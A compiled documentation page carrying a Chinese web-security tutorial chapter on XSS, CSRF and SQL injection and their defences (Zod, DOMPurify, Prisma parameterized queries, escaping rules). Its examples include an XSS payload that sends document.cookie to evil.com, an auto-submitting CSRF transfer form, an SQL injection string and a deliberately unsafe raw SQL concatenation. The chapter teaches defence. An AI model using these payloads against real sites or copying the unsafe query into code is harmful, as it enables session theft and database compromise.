import{_ as E,C as d,c as r,o as n,j as i,b as l,a3 as k,a,w as t,G as e,a4 as p}from"./chunks/framework.CUcrqFol.js";const C=JSON.parse('{"title":"6.4 认识常见的网络小偷——常见 Web 安全威胁与防护","description":"6.4 认识常见的网络小偷——常见 Web 安全威胁与防护 认知重构 Web 安全威胁并不神秘。它们的本质都是**利用系统的信任机制**：浏览器信任网站返回的内容、服务器信任已登录用户的请求、数据库信任应用传来的查询。攻击者做的，就是在这些\\"信任链\\"中找到可以钻的空子。 本节内容 | 小节 | 核心问题 | 你将学会","frontmatter":{"title":"6.4 认识常见的网络小偷——常见 Web 安全威胁与防护","typora-root-url":"../../public"},"headers":[],"relativePath":"Advanced-old/06-security/6.4-web-threats/index.md","filePath":"Advanced-old/06-security/6.4-web-threats/index.md","lastUpdated":1766168364000}'),o={name:"Advanced-old/06-security/6.4-web-threats/index.md"};function g(y,s,F,c,A,B){const h=d("Mermaid");return n(),r("div",null,[s[2]||(s[2]=i("h1",{id:"_6-4-认识常见的网络小偷——常见-web-安全威胁与防护",tabindex:"-1"},[a("6.4 认识常见的网络小偷——常见 Web 安全威胁与防护 "),i("a",{class:"header-anchor",href:"#_6-4-认识常见的网络小偷——常见-web-安全威胁与防护","aria-label":'Permalink to "6.4 认识常见的网络小偷——常见 Web 安全威胁与防护"'},"​")],-1)),s[3]||(s[3]=i("h2",{id:"认知重构",tabindex:"-1"},[a("认知重构 "),i("a",{class:"header-anchor",href:"#认知重构","aria-label":'Permalink to "认知重构"'},"​")],-1)),s[4]||(s[4]=i("p",null,[a("Web 安全威胁并不神秘。它们的本质都是"),i("strong",null,"利用系统的信任机制"),a('：浏览器信任网站返回的内容、服务器信任已登录用户的请求、数据库信任应用传来的查询。攻击者做的，就是在这些"信任链"中找到可以钻的空子。')],-1)),(n(),l(p,null,{default:t(()=>[e(h,{id:"mermaid-9",class:"mermaid",graph:"flowchart%20TD%0A%20%20%20%20subgraph%20Threats%5B%22%E5%B8%B8%E8%A7%81%E5%A8%81%E8%83%81%22%5D%0A%20%20%20%20%20%20%20%20XSS%5B%22XSS%5Cn%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%22%5D%0A%20%20%20%20%20%20%20%20CSRF%5B%22CSRF%5Cn%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%22%5D%0A%20%20%20%20%20%20%20%20Injection%5B%22%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%5CnSQL%2F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%22%5D%0A%20%20%20%20end%0A%20%20%20%20%0A%20%20%20%20subgraph%20Trust%5B%22%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84%E4%BF%A1%E4%BB%BB%22%5D%0A%20%20%20%20%20%20%20%20T1%5B%22%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E4%BB%BB%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%22%5D%0A%20%20%20%20%20%20%20%20T2%5B%22%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E4%BB%BB%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%22%5D%0A%20%20%20%20%20%20%20%20T3%5B%22%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E4%BB%BB%E5%BA%94%E7%94%A8%E6%9F%A5%E8%AF%A2%22%5D%0A%20%20%20%20end%0A%20%20%20%20%0A%20%20%20%20XSS%20--%3E%7C%E5%88%A9%E7%94%A8%7C%20T1%0A%20%20%20%20CSRF%20--%3E%7C%E5%88%A9%E7%94%A8%7C%20T2%0A%20%20%20%20Injection%20--%3E%7C%E5%88%A9%E7%94%A8%7C%20T3%0A"})]),fallback:t(()=>[...s[0]||(s[0]=[a(" Loading... ",-1)])]),_:1})),s[5]||(s[5]=k(`<h2 id="本节内容" tabindex="-1">本节内容 <a class="header-anchor" href="#本节内容" aria-label="Permalink to &quot;本节内容&quot;">​</a></h2><table tabindex="0"><thead><tr><th>小节</th><th>核心问题</th><th>你将学会</th></tr></thead><tbody><tr><td>6.4.1 XSS 防护</td><td>恶意脚本如何被注入？</td><td>输入验证与输出编码</td></tr><tr><td>6.4.2 CSRF 防护</td><td>身份如何被盗用？</td><td>Token 验证与 SameSite</td></tr><tr><td>6.4.3 CORS 配置</td><td>跨域请求怎么控制？</td><td>安全的跨域策略</td></tr><tr><td>6.4.4 同源策略</td><td>浏览器如何保护用户？</td><td>理解浏览器安全基础</td></tr><tr><td>6.4.5 输入验证</td><td>如何防止注入攻击？</td><td>参数化查询与验证</td></tr></tbody></table><h2 id="攻击原理速览" tabindex="-1">攻击原理速览 <a class="header-anchor" href="#攻击原理速览" aria-label="Permalink to &quot;攻击原理速览&quot;">​</a></h2><h3 id="xss-让你的网站执行别人的代码" tabindex="-1">XSS：让你的网站执行别人的代码 <a class="header-anchor" href="#xss-让你的网站执行别人的代码" aria-label="Permalink to &quot;XSS：让你的网站执行别人的代码&quot;">​</a></h3><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 用户在评论框输入 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https://evil.com/steal?cookie=&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> document.cookie)&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 如果网站直接渲染，攻击者就能偷走所有访问者的 Cookie --&gt;</span></span></code></pre></div><h3 id="csrf-借用你的身份做坏事" tabindex="-1">CSRF：借用你的身份做坏事 <a class="header-anchor" href="#csrf-借用你的身份做坏事" aria-label="Permalink to &quot;CSRF：借用你的身份做坏事&quot;">​</a></h3><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- evil.com 的隐藏表单 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">form</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> action</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;https://bank.com/transfer&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> method</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;POST&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">input</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;to&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;attacker&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">input</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;amount&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;10000&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">form</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;document.forms[</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">].</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">submit</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">()&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 用户已登录 bank.com，浏览器自动带上 Cookie --&gt;</span></span></code></pre></div><h3 id="sql-注入-绕过你的验证逻辑" tabindex="-1">SQL 注入：绕过你的验证逻辑 <a class="header-anchor" href="#sql-注入-绕过你的验证逻辑" aria-label="Permalink to &quot;SQL 注入：绕过你的验证逻辑&quot;">​</a></h3><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">-- 用户输入用户名：admin&#39; OR &#39;1&#39;=&#39;1</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">SELECT</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> FROM</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">WHERE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> username </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;admin&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> OR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;1&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;1&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> AND</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> password</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;...&#39;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">-- 这条 SQL 总是返回结果，绕过了密码验证</span></span></code></pre></div><h2 id="防御思维模型" tabindex="-1">防御思维模型 <a class="header-anchor" href="#防御思维模型" aria-label="Permalink to &quot;防御思维模型&quot;">​</a></h2><p>防御的核心原则只有一条：<strong>永远不要信任用户输入</strong>。</p>`,11)),(n(),l(p,null,{default:t(()=>[e(h,{id:"mermaid-106",class:"mermaid",graph:"flowchart%20LR%0A%20%20%20%20Input%5B%22%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%22%5D%20--%3E%20Validate%5B%22%E9%AA%8C%E8%AF%81%5Cn%E6%A0%BC%E5%BC%8F%2F%E7%B1%BB%E5%9E%8B%2F%E8%8C%83%E5%9B%B4%22%5D%0A%20%20%20%20Validate%20--%3E%20Sanitize%5B%22%E6%B8%85%E7%90%86%5Cn%E7%A7%BB%E9%99%A4%E5%8D%B1%E9%99%A9%E5%86%85%E5%AE%B9%22%5D%0A%20%20%20%20Sanitize%20--%3E%20Escape%5B%22%E8%BD%AC%E4%B9%89%5Cn%E6%A0%B9%E6%8D%AE%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BC%96%E7%A0%81%22%5D%0A%20%20%20%20Escape%20--%3E%20Use%5B%22%E5%AE%89%E5%85%A8%E4%BD%BF%E7%94%A8%22%5D%0A"})]),fallback:t(()=>[...s[1]||(s[1]=[a(" Loading... ",-1)])]),_:1})),s[6]||(s[6]=k(`<h3 id="不同上下文的转义规则" tabindex="-1">不同上下文的转义规则 <a class="header-anchor" href="#不同上下文的转义规则" aria-label="Permalink to &quot;不同上下文的转义规则&quot;">​</a></h3><table tabindex="0"><thead><tr><th>上下文</th><th>危险字符</th><th>转义方式</th></tr></thead><tbody><tr><td>HTML 内容</td><td><code>&lt; &gt; &amp; &quot; &#39;</code></td><td>HTML 实体编码</td></tr><tr><td>HTML 属性</td><td><code>&quot; &#39;</code></td><td>属性值编码</td></tr><tr><td>JavaScript</td><td><code>&#39; &quot; \\</code></td><td>JS 转义</td></tr><tr><td>URL 参数</td><td><code>&amp; = ? #</code></td><td>URL 编码</td></tr><tr><td>SQL 查询</td><td><code>&#39; &quot; ; --</code></td><td>参数化查询</td></tr></tbody></table><h2 id="安全工具链" tabindex="-1">安全工具链 <a class="header-anchor" href="#安全工具链" aria-label="Permalink to &quot;安全工具链&quot;">​</a></h2><h3 id="_1-输入验证-zod" tabindex="-1">1. 输入验证：Zod <a class="header-anchor" href="#_1-输入验证-zod" aria-label="Permalink to &quot;1. 输入验证：Zod&quot;">​</a></h3><div class="language-typescript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">typescript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { z } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;zod&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> UserInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> z.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">object</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">({</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  email: z.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">email</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(),</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  name: z.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">min</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">max</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">100</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">regex</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[a-zA-Z\\s]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  age: z.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">number</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">int</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">min</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">max</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">150</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">})</span></span></code></pre></div><h3 id="_2-html-清理-dompurify" tabindex="-1">2. HTML 清理：DOMPurify <a class="header-anchor" href="#_2-html-清理-dompurify" aria-label="Permalink to &quot;2. HTML 清理：DOMPurify&quot;">​</a></h3><div class="language-typescript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">typescript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;isomorphic-dompurify&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> clean</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(dirtyHtml, {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  ALLOWED_TAGS: [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;b&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;i&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;em&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;strong&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">],</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">})</span></span></code></pre></div><h3 id="_3-参数化查询-prisma" tabindex="-1">3. 参数化查询：Prisma <a class="header-anchor" href="#_3-参数化查询-prisma" aria-label="Permalink to &quot;3. 参数化查询：Prisma&quot;">​</a></h3><div class="language-typescript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">typescript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// ✅ 安全：Prisma 自动参数化</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> user</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> await</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> prisma.user.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">findFirst</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">({</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  where: { email: userInput }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">})</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// ❌ 危险：原始 SQL 拼接</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> user</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> await</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> prisma.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">$queryRawUnsafe</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">  \`SELECT * FROM users WHERE email = &#39;\${</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">userInput</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}&#39;\`</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span></code></pre></div><h2 id="ai-协作提示" tabindex="-1">AI 协作提示 <a class="header-anchor" href="#ai-协作提示" aria-label="Permalink to &quot;AI 协作提示&quot;">​</a></h2><p>在让 AI 生成涉及用户输入的代码时，明确要求：</p><ul><li>&quot;使用 Zod 验证所有用户输入&quot;</li><li>&quot;使用参数化查询，不要拼接 SQL&quot;</li><li>&quot;使用 DOMPurify 清理需要渲染的 HTML&quot;</li><li>&quot;所有输出到页面的内容都要转义&quot;</li></ul><div class="warning custom-block"><p class="custom-block-title">安全审查清单</p><ol><li>[ ] 所有用户输入都经过验证</li><li>[ ] 不直接拼接 SQL 语句</li><li>[ ] 不使用 <code>dangerouslySetInnerHTML</code></li><li>[ ] 配置了 CSP 响应头</li><li>[ ] Cookie 设置了 HttpOnly 和 Secure</li></ol></div>`,13))])}const m=E(o,[["render",g]]);export{C as __pageData,m as default};
